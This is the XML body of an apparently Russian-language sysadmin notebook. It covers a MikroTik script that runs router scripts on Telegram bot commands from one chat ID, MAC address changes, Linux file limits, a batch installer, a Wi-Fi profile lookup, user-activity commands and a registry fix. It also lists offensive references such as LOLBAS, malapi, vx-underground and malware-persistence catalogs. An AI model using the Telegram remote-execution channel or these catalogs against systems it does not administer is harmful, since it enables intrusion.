      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="20"/>:set $dateD ($dateD + 1); </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="20"/>:break;</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="16"/>} else={ :set $dateD ($dateD - ($days-&gt;$i)); } </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3"><text:s text:c="12"/>}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>} on-error={}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:local timeS ($timeStamp % 86400);</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:local timeH ($timeS / 3600);</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:local timeM ($timeS % 3600 / 60);</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:set <text:s/>$timeS ($timeS - $timeH * 3600 - $timeM * 60);</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:local normalTime (($months-&gt;$dateM)."/");</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:if ($dateD &lt; 10) do={ :set $normalTime ($normalTime."0".[:tostr $dateD]."/"); } else={ :set $normalTime ($normalTime.[:tostr $dateD]."/"); }</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:set $normalTime ($normalTime.[:tostr $dateY]." "); <text:s text:c="2"/></text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:if ($timeH &lt; 10) do={ :set $normalTime ($normalTime."0".[:tostr $timeH].":"); } else={ :set $normalTime ($normalTime.[:tostr $timeH].":"); }</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:if ($timeM &lt; 10) do={ :set $normalTime ($normalTime."0".[:tostr $timeM].":"); } else={ :set $normalTime ($normalTime.[:tostr $timeM].":"); }</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:if ($timeS &lt; 10) do={ :set $normalTime ($normalTime."0".[:tostr $timeS]); } <text:s text:c="4"/>else={ :set $normalTime ($normalTime.[:tostr $timeS]); }</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:put ([:totime $normalTime]);</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:return $normalTime;</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/># Main body of the script</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>:local nameID <text:s text:c="2"/>[ /system identity get name; ];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>:local dateNow <text:s/>[ /system clock <text:s text:c="3"/>get date; ];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>:local timeNow <text:s/>[ /system clock <text:s text:c="3"/>get time; ];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>:local httpResponse [ /tool fetch url="https://api.telegram.org/$botID/getUpdates\?offset=-1&amp;limit=1&amp;allowed_updates=message&amp;timeout=60" as-value output=user; ];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>:local content ($httpResponse-&gt;"data");</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>:if ([:len $content] &gt; 30) do={</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:local msgId <text:s text:c="3"/>[$parse content=$content variable="update_id"];</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:local message <text:s/>[$parse content=$content variable="text" quotas=true];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:set <text:s text:c="2"/>message ([:pick $message ([:find $message "/"] + 1) ([:len $message])]);</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:local chat <text:s text:c="4"/>[$parse content=$content variable="chat"];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:local chatId <text:s text:c="2"/>[$parse content=$chat <text:s text:c="3"/>variable="id"];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:local userName [$parse content=$content variable="username"];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:local dateTime [$parse content=$content variable="date"];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:set <text:s text:c="2"/>dateTime ($dateTime + [ /system clock get gmt-offset; ]);</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:local normTime [$unixTime timeStamp=$dateTime];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:put ("Current time on router:\t $dateNow $timeNow");</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:put ("Last message from $userName: time=$normTime, id=$msgId, text=$message.");</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:if (($normTime ~ $dateNow) &amp;&amp; ([:totime [:pick $normTime ([:find $normTime " "] + 1) ([:find $normTime " "] + 9)]] &gt; ($timeNow - 00:01:00))) do={</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="12"/>:put ("Right time to activation script.");</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3"><text:s text:c="12"/>:if (($chatId = $myChatID) &amp;&amp; ([/system script find name=$message] != "")) do={</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="16"/>:put ("Telegram user $userName activated script '$message'.");</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="16"/>:log warning ("Telegram user $userName activated script '$message'."); <text:s text:c="16"/></text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="16"/>/system script run $message;</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="16"/>/tool fetch keep-result=no url="https://api.telegram.org/$botID/sendmessage\?chat_id=$chatId&amp;text=$nameID: '$message' command accepted.";</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="12"/>} else={ :put ("Not all conditions activation script are met."); }</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>} else={ :put ("Bad time to activation script."); }</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">} on-error={ :put ("Script error: 1 - message could have been sent a long time ago. 2 - check whether 'botID' &amp; 'myChatID' variables are specified correctly."); }</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как узнать и при необходимости изменить MAC-адрес в Windows?</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Если необходимо изменить этот адрес:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1. Запустите «Диспетчер устройств» (удобно найти через поиск).</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">2. Кликните «Сетевые адаптеры» и выберите нужный для вас, ПКМ по нему → «Свойства».</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">3. Перейдите во вкладку «Дополнительно» и выберите свойство «Сетевой адрес».</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">4. В поле «Значение» пропишите новый Mac-адрес и примените изменения.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как найти количество открытых файлов в Linux</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Значение сохраняется в</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># cat /proc/sys/fs/file-max</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Проверка Hard лимит в Linux</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># ulimit -Hn</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Проверка Soft лимит в Linux</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># ulimit -Sn</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Чтобы просмотреть значения Hard и Soft для разных пользователей, переключите пользователя с «su» на пользователя, ограничения которого вы хотите проверить.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Например</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># su root</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$ ulimit -Sn</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$ ulimit -Hn</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как проверить количество системных дескрипторов файлов в Linux</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Вы можете увеличить лимит открытых файлов в Linux, отредактировав опцию ядра fs.file-max. Для этого используйте утилиту sysctl.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Sysctl используется для настройки параметров ядра.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Например, чтобы увеличить ограничение на количество открых файла до 500000, вы можете использовать следующую команду:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># sysctl -w fs.file-max=500000</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Вы можете проверить текущее значение для количества открытых файлов с помощью следующей команды:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$ cat /proc/sys/fs/file-max</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># vi /etc/sysctl.conf</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Добавьте следующую команду:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">fs.file-max=500000</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Конечно, вы можете изменить число в соответствии с вашими потребностями. Чтобы снова проверить изменения, используйте:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># cat /proc/sys/fs/file-max</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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8"><text:span text:style-name="T1"># sysctl -p</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># vi /etc/security/limits.conf</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">&lt;domain&gt;        &lt;type&gt;  &lt;item&gt;  &lt;value&gt;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Вот пример установки Soft и Hard лимитов для пользователя dimon:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">## Example hard limit for max opened files</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">dimon hard nofile 4096</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">## Example soft limit for max opened files</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">dimon soft nofile 1024</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Batch-</text:span><text:span text:style-name="T1">скрипт</text:span><text:span text:style-name="T3">. </text:span><text:span text:style-name="T1">Устаналивает портабельную программу с сетевого диска на локальный диск пользователя и выводит ярлык на рабочий стол. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">@echo off</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">rem меняем кодировку чтобы использовать кириллицу</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">chcp 1251 &gt;nul</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">rem указываем директорию с программой для копирования (в нашем случае на сетевом диске М)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">set old_dir="M:\Programs\ExampleProgramPortable"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">rem указываем директорию куда копировать программу (в нашем случае в корень диска С)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">set new_dir="C:\ExampleProgramPortable"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">rem копируем ярлык программы в общую папку для всех пользователей, чтобы вывести на рабочий стол</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">rem переименовываем ярлык кириллицей (если нужно)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">rem </text:span><text:span text:style-name="T1">делаем</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">запись</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">в</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">лог</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">If Exist "%new_dir%\*.*" (</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">echo %date% %time:~-11,8% DIR exist already &gt;&gt; M:\logs\%username%.txt</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">) Else (</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">xcopy %old_dir% %new_dir% /i /e /h /y</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">xcopy "C:\ExampleProgramPortable\example_program.lnk" C:\Users\Public\Desktop</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">rename "C:\Users\Public\Desktop\example_program.lnk" </text:span><text:span text:style-name="T1">Программа</text:span><text:span text:style-name="T3">.lnk</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">echo %date% %time:~-11,8% Example Program install successful &gt;&gt; M:\logs\%username%.txt</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T1">)</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1. Нажмите сочетание «Win+R» и введите команду «cmd», чтобы открыть командную строку.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">2. </text:span><text:span text:style-name="T1">Введите</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">команду</text:span><text:span text:style-name="T3"> «netsh wlan show profiles». </text:span><text:span text:style-name="T1">На экране вы увидите список всех известных Wi-Fi сетей. Запомните имя нужной вам сети.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">unprotect.it</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">lolbas-project.github.io</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">hijacklibs.net</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">malapi.io</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">lots-project.com</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">github.com/Karneades/awesome-malware-persistence</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">github.com/m0nad/awesome-privilege-escalation</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">github.com/stuhli/awesome-event-ids</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">orkl.eu</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">vx-underground.org/windows.html</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Команды для получения сведений о системе, активности пользователей</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">date</text:span><text:span text:style-name="T1"> - вывести текущую дату и время</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cal</text:span><text:span text:style-name="T1"> - вывести календарь на текущий месяц</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">uptime</text:span><text:span text:style-name="T1"> - показать время с момента последней загрузки ОС.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">w</text:span><text:span text:style-name="T1"> - сведения о пользователях, зарегистрировавшихся в системе</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">users</text:span><text:span text:style-name="T1"> - список имен пользователей, вошедших в систему.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">last</text:span><text:span text:style-name="T1"> - список пользователей, вошедших в систему по данным из специального файла /</text:span><text:span text:style-name="T3">var</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">log</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">wtmp</text:span><text:span text:style-name="T1">. Отображается имя, терминал, время входа </text:span><text:span text:style-name="T3">IP</text:span><text:span text:style-name="T1">-адрес и т.п.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">last</text:span><text:span text:style-name="T1"> - </text:span><text:span text:style-name="T3">ad</text:span><text:span text:style-name="T1"> - сведения о пользователях, вошедших в систему, с отображением в последней колонке имени компьютера с которого выполнен вход.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">last</text:span><text:span text:style-name="T1"> - </text:span><text:span text:style-name="T3">F</text:span><text:span text:style-name="T1"> - отобразить время входа пользователей в систему, длительность сессий и время выхода.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">last</text:span><text:span text:style-name="T1"> - </text:span><text:span text:style-name="T3">x</text:span><text:span text:style-name="T1"> - отобразить сведения о выключениях, перезагрузках и изменениях уровня запуска системы.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">last</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">root</text:span><text:span text:style-name="T1"> - отобразить сведения о сеансах пользователя </text:span><text:span text:style-name="T3">root</text:span><text:span text:style-name="T1">.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">last</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">n</text:span><text:span text:style-name="T1"> 10 </text:span><text:span text:style-name="T3">user</text:span><text:span text:style-name="T1">1 - отобразить сведения о десяти последних сеансах пользователя </text:span><text:span text:style-name="T3">user</text:span><text:span text:style-name="T1">1.</text:span></text:p>
      <text:p text:style-name="P10" loext:marker-style-name="T2"><text:span text:style-name="T3">lastlog</text:span><text:span text:style-name="T1"> - отобразить список всех пользователей и время их последнего входа в систему.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">whoami</text:span><text:span text:style-name="T1"> - имя, под которым вы в данный момент работаете в системе.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">finger</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">user</text:span><text:span text:style-name="T1"> - показать информацию о </text:span><text:span text:style-name="T3">user</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">uname</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">a</text:span><text:span text:style-name="T1"> - отобразить все сведения о системе.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">uname</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">vr</text:span><text:span text:style-name="T1"> - отобразить номер выпуска операционной системы и версию ядра.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">df</text:span><text:span text:style-name="T1"> - отобразить информацию об использовании дисков.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">du</text:span><text:span text:style-name="T1"> - отобразить информацию об использовании текущего каталога</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">free</text:span><text:span text:style-name="T1"> - информация об использовании реальной и виртуальной памяти.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">whatis</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">app</text:span><text:span text:style-name="T1"> - отобразить краткую информацию об </text:span><text:span text:style-name="T3">app</text:span><text:span text:style-name="T1"> из базы данных документации.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">whereis</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">app</text:span><text:span text:style-name="T1"> - где находится исполняемый модуль </text:span><text:span text:style-name="T3">app</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">which</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">app</text:span><text:span text:style-name="T1"> - какой исполняемый модуль приложения </text:span><text:span text:style-name="T3">app</text:span><text:span text:style-name="T1"> будет запущен по умолчанию.</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">man</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">command</text:span><text:span text:style-name="T1"> - отобразить справочную информацию для команды </text:span><text:span text:style-name="T3">command</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Черный экран на терминальном сервере windows server 2019</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Данная проблема возникает из-за большого количества правил для Cortana в ветке реестра:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Данные правила создаются при входе на терминальный сервер и должны удаляться при выходе, но увы этого не происходит</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Удаляем ветку и заново ее создаем:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\RestrictedServices\AppIso\FirewallRules"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">New-Item "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\RestrictedServices\AppIso\FirewallRules"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Создаем дополнительный ключ реестра, чтобы правила больше не создавались повторно:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy" -Name "DeleteUserAppContainersOnLogoff" -Value ”1” <text:s/>-PropertyType "DWord"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Перезагружаемся </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Управление сервисами systemd через утилиту systemctl</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">systemctl start name.service - </text:span><text:span text:style-name="T1">запуск</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">сервиса</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">systemctl stop name.service - </text:span><text:span text:style-name="T1">остановка</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">сервиса</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">systemctl restart name.service - </text:span><text:span text:style-name="T1">перезапуск</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">сервиса</text:span></text:p>
